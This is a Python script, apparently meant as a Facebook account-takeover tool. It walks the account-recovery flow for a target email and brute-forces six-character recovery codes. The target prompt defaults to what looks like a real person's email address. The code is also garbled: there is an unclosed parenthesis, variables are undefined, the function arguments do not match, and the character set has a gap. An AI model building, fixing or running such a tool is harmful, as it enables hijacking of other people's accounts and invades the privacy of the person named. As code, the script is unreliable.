import itertools
import sys
from time import sleep
from bs4 import BeautifulSoup
import requests
import mechanize
import os
import re
CHRS = '0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ'

MOZILLA_UAS = 'Mozilla/5.0 (X11; U; Linux i686; en-US) ' \
              'AppleWebKit/534.7 (KHTML, like Gecko) ' \
              'Chrome/7.0.517.41 Safari/534.7' 

LOGIN_URL = 'https://mbasic.facebook.com/login/?ref=dbl&fl&login_from_aymh=1'

def __init__(self):
    self.browser = self.setup_browser()

def setup_browser(self):
    browser = mechanize.Browser()
    browser.set_handle_robots(False)
    cookies = mechanize.CookieJar()
    browser.set_cookiejar(cookies)
    browser.addheaders = [('User-agent', MOZILLA_UAS)]
    browser.set_handle_refresh(False)
    return browser

def passcode6():
  try:
    f = open("6digits.txt", "a")
    f.close()
  except:
    f = open("6digits.txt", "a+")
    for combination in itertools.product(range(10), repeat=6):
        f.write(''.join(map(str, combination)))
  try:
    z = open("8digits.txt", "a")
    z.close()
  except:
    z = open("8digits.txt", "a+")
    for combination in itertools.product(range(10), repeat=8):
      z.write(''.join(map(str, combination)))

def sleepy(counter):
  x = counter
  y = 0
  while x > y:
    x -= 1
    z = x
    if x <= 9:
      code = ("0", str(z))
      yo = h.join(code)
      x 
      print(yo, end='\r')
    else:
      print(x, end='\r')
    sleep(1)

def fb_hack(email, codex):
  soup = BeautifulSoup()
  browser = mechanize.Browser()
  browser.set_handle_robots(False)
  cookies = mechanize.CookieJar()
  browser.set_cookiejar(cookies)
  browser.addheaders = [('User-agent', MOZILLA_UAS)]
  browser.set_handle_refresh(False)
  browser.open('https://facebook.com/login/identify/?ctx=recover&ars=facebook_login&from_login_screen=0&_fb_noscript=l')
  browser.select_form(nr=0)
  browser.form['email'] = email 
  browser.submit()
  """print(browser.geturl())
  forms = list(browser.forms())
  print(forms)"""
  browser.select_form(nr=0)
  browser.form['pass'] = str(1)
  browser.submit()
  for combination in  itertools.product([0,1,2,3,4,5,6,7,8,9,"a","b","c","d","e","f","g","h","i","j","k","l","m","n","o","p","q","r","s","t","u","v","w","x","y","z","A","B","C","D","E","F","G","H","I","J","K","L","M","N","O","P","Q","R","S","T","U","V","","X","Y","Z"], repeat=6):
    if counter < codex:
      x = (''.join(map(str, combination)))
      codex += 1
    else:
      try:
        x = (''.join(map(str, combination)))
        browser.form['pass'] = x
        test = (x, " failed")
        sleepy(30)
        counter += 1
        yo = h.join(test)
        response1 = browser.response()
        soup = BeautifulSoup(response1, 'html.parser')
        z = soup.find(string("Try another way")
        if z == "None":
          raise
        else:
          z ==1         
      except:
        response1 = browser.response()
        soup = BeautifulSoup(response1, 'html.parser')
        with open("output1.html", "w") as file:
          file.write(str(soup))
        with open("output1.txt", "w") as file:
        file.write(str(soup))
        print(counter)

os.system('clear')
ehack = input('Email address or username to attack:') or str("amschwab@comcast.net")
reset = int(input('Code: ') or 0)

fb_hack(ehack, reset, sear)
